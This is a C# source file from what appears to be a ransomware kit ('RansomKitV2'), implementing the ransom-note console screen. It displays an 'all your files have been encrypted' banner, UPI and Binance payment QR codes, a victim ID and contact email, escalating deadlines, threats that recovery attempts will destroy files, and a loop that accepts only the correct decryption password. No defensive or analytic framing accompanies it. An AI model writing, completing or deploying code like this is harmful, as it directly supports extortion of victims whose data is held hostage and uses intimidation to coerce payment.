using QRCoder;
using System;
using System.Linq;
using System.Threading;

namespace RansomKitV2
{
    // ══════════════════════════════════════════════════════════════
    //  PaymentScreen
    //
    //  Full-console ransom UI:
    //    • ASCII banner
    //    • ASCII QR code for UPI deep-link (QRCoder library)
    //    • UPI ID + amount
    //    • Binance / crypto address
    //    • Password entry with verify loop
    // ══════════════════════════════════════════════════════════════

    static class PaymentScreen
    {
        // ── Show (blocking) ───────────────────────────────────────

        /// <summary>
        /// Displays the ransom screen and blocks until the correct password is entered.
        /// Returns the verified password string.
        /// </summary>

        public static string ShowAndWait(
            string victimId, string upiId, string upiAmount,
            string binanceAddress, string contactEmail, string masterKeyHash)
        {
            while (true)
            {
                Console.Clear();
                Console.CursorVisible = true;

                DrawBanner();
                DrawVictimId(victimId);
                DrawUpiSection(upiId, upiAmount);
                DrawCryptoSection(binanceAddress);
                DrawContactSection(contactEmail, victimId);
                DrawWarning();
                DrawPasswordPrompt();

                string? input = ReadPassword();

                if (string.IsNullOrWhiteSpace(input))
                {
                    Flash(ConsoleColor.Red, "  No password entered. Press any key and try again.");
                    continue;
                }

                if (CryptoEngine.VerifyPassword(input, masterKeyHash))
                    return input;

                Flash(ConsoleColor.Red,
                    "  ✗  Wrong password. If you paid, contact support with your Victim ID.");
            }
        }

        // ── Banner ────────────────────────────────────────────────

        static void DrawBanner()
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(@"
  ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
  ██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
  ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
  ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝
");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  !!! ALL YOUR IMPORTANT FILES HAVE BEEN ENCRYPTED !!!");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("  To regain access, you must pay the ransom described below.\n");
            Console.ResetColor();
        }

        // ── Victim ID ─────────────────────────────────────────────

        static void DrawVictimId(string id)
        {
            Box($"  YOUR UNIQUE VICTIM ID: {id}", ConsoleColor.Cyan);
            Console.WriteLine("  Include this ID in ALL communications with us.\n");
        }

        // ── UPI section ───────────────────────────────────────────

        static void DrawUpiSection(string upiId, string amount)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("  ╔══════════════════════════════════════════════════════════╗");
            Console.WriteLine("  ║            OPTION 1 — UPI PAYMENT (INDIA)               ║");
            Console.WriteLine("  ╠══════════════════════════════════════════════════════════╣");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"  ║  UPI ID  :  {upiId,-47}║");
            Console.WriteLine($"  ║  Amount  :  ₹{amount,-46}║");
            Console.WriteLine("  ║  App     :  PhonePe / Google Pay / Paytm / BHIM         ║");
            Console.WriteLine("  ║                                                          ║");
            Console.WriteLine("  ║  Scan QR below or open any UPI app and pay manually.    ║");
            Console.WriteLine("  ╚══════════════════════════════════════════════════════════╝\n");
            Console.ResetColor();

            // ASCII QR code for the UPI deep-link
            DrawUpiQr(upiId, amount);
        }

        static void DrawUpiQr(string upiId, string amount)
        {
            // URL-encode everything — a note with spaces/&/=/? will silently break the URI
            string encPa = Uri.EscapeDataString(upiId);
            string encTn = Uri.EscapeDataString("FileDecryption");

            // force invariant decimal — a German/Indian locale could emit "10,00" and break the app
            string amt = decimal.TryParse(amount, System.Globalization.NumberStyles.Number,
                                          System.Globalization.CultureInfo.InvariantCulture, out var a)
                         ? a.ToString("0.00", System.Globalization.CultureInfo.InvariantCulture)
                         : amount;

            string uri = $"upi://pay?pa={encPa}&am={amt}&cu=INR&tn={encTn}";

            try
            {
                var gen = new QRCodeGenerator();
                var data = gen.CreateQrCode(uri, QRCodeGenerator.ECCLevel.M);
                var ascii = new AsciiQRCode(data);

                string[] lines = ascii.GetGraphic(1, drawQuietZones: true)
                    .Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);

                // widest line = box interior width
                int width = lines.Max(l => l.Length);

                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("  ┌─ Scan with any UPI app " + new string('─', width + 2) + "┐");
                foreach (var line in lines)
                    Console.WriteLine("  │ " + line.PadRight(width) + " │");
                Console.WriteLine("  └" + new string('─', width + 2) + "┘\n");
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"  UPI URI: {uri}");
                Console.WriteLine("  (Open your UPI app and enter the UPI ID manually)\n");
            }
            finally
            {
                Console.ResetColor();
            }
        }

        // ── Crypto section ────────────────────────────────────────

        static void DrawCryptoSection(string address)
        {
            const int W = 58;                                   // inner box width

            static string Fit(string s, int w) =>
                s.Length <= w ? s.PadRight(w) : s.Substring(0, w - 1) + "~";

            static string Row(string s, int w) => "  \u2551 " + Fit(s, w - 2) + " \u2551";

            try
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("  \u2554" + new string('\u2550', W) + "\u2557");
                Console.WriteLine(Row("OPTION 2 - BINANCE / CRYPTO (INTERNATIONAL)", W));
                Console.WriteLine("  \u2560" + new string('\u2550', W) + "\u2563");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine(Row("Network  :  BNB Smart Chain (BEP-20) or Bitcoin", W));
                Console.WriteLine(Row("Address  :  " + address, W));
                Console.WriteLine(Row("Amount   :  0.05 BTC  OR  50 USDT", W));
                Console.WriteLine(Row("Open Binance -> Send -> paste address above", W));
                Console.WriteLine("  \u255A" + new string('\u2550', W) + "\u255D\n");

                // QR
                var gen = new QRCodeGenerator();
                var data = gen.CreateQrCode(address, QRCodeGenerator.ECCLevel.Q);
                var ascii = new AsciiQRCode(data);

                string[] lines = ascii.GetGraphic(1, drawQuietZones: true)
                    .Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);

                int qw = lines.Max(l => l.Length);
                string top = "  \u250C\u2500 Binance / Crypto wallet QR " + new string('\u2500', Math.Max(0, qw - 29)) + "\u2510";
                string bot = "  \u2514" + new string('\u2500', qw + 2) + "\u2518\n";

                Console.WriteLine(top);
                foreach (var line in lines)
                    Console.WriteLine("  \u2502 " + line.PadRight(qw) + " \u2502");
                Console.WriteLine(bot);
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("  QR render failed: " + ex.Message);
                Console.WriteLine("  Address: " + address + "\n");
            }
            finally
            {
                Console.ResetColor();
            }
        }

        // ── Contact / instructions ────────────────────────────────

        static void DrawContactSection(string email, string victimId)
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("  ┌─ HOW TO GET YOUR FILES BACK ─────────────────────────────┐");
            Console.WriteLine("  │                                                            │");
            Console.WriteLine("  │  1. Pay via UPI  OR  Binance above.                       │");
            Console.WriteLine("  │  2. Take a screenshot of the payment confirmation.         │");
            Console.WriteLine($"  │  3. Email us at:  {email,-42}│");
            Console.WriteLine($"  │     Subject:  DECRYPT-{victimId,-36}│");
            Console.WriteLine("  │  4. Attach screenshot as proof.                            │");
            Console.WriteLine("  │  5. Receive your 44-character decryption password.         │");
            Console.WriteLine("  │  6. Enter it in the box below.                             │");
            Console.WriteLine("  │                                                            │");
            Console.WriteLine("  │  ⏱  Price doubles after 72 hours.                         │");
            Console.WriteLine("  │  ⏱  After 7 days the master key is destroyed forever.     │");
            Console.WriteLine("  └────────────────────────────────────────────────────────────┘\n");
            Console.ResetColor();
        }

        // ── Warning ───────────────────────────────────────────────

        static void DrawWarning()
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("  ┌─ !!! CRITICAL WARNING !!! ───────────────────────────────┐");
            Console.WriteLine("  │                                                            │");
            Console.WriteLine("  │  ✗  Do NOT rename or move .locked files.                  │");
            Console.WriteLine("  │  ✗  Do NOT try 3rd-party decryption tools.                │");
            Console.WriteLine("  │  ✗  Do NOT reinstall Windows.                             │");
            Console.WriteLine("  │  ✗  Do NOT use System Restore or Reset This PC.           │");
            Console.WriteLine("  │                                                            │");
            Console.WriteLine("  │  → Any Windows reset or recovery attempt will             │");
            Console.WriteLine("  │    PERMANENTLY DELETE all your encrypted files.           │");
            Console.WriteLine("  │    They will be gone with NO chance of recovery.          │");
            Console.WriteLine("  │                                                            │");
            Console.WriteLine("  └────────────────────────────────────────────────────────────┘\n");
            Console.ResetColor();
        }

        // ── Password input ────────────────────────────────────────

        static void DrawPasswordPrompt()
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("  Enter the 44-character decryption password:");
            Console.Write("  > ");
            Console.ResetColor();
        }

        static string? ReadPassword()
        {
            // Show input (not masked — password is a long base64 string, hard to guess)
            return Console.ReadLine();
        }

        // ── Helpers ───────────────────────────────────────────────

        static void Box(string text, ConsoleColor c)
        {
            Console.ForegroundColor = c;
            string border = new string('═', text.Length + 4);
            Console.WriteLine("  ╔" + border + "╗");
            Console.WriteLine("  ║  " + text + "  ║");
            Console.WriteLine("  ╚" + border + "╝");
            Console.ResetColor();
        }

        static void Flash(ConsoleColor c, string msg)
        {
            Console.ForegroundColor = c;
            Console.WriteLine("\n" + msg);
            Console.ResetColor();
            Thread.Sleep(2_500);
        }
    }
}
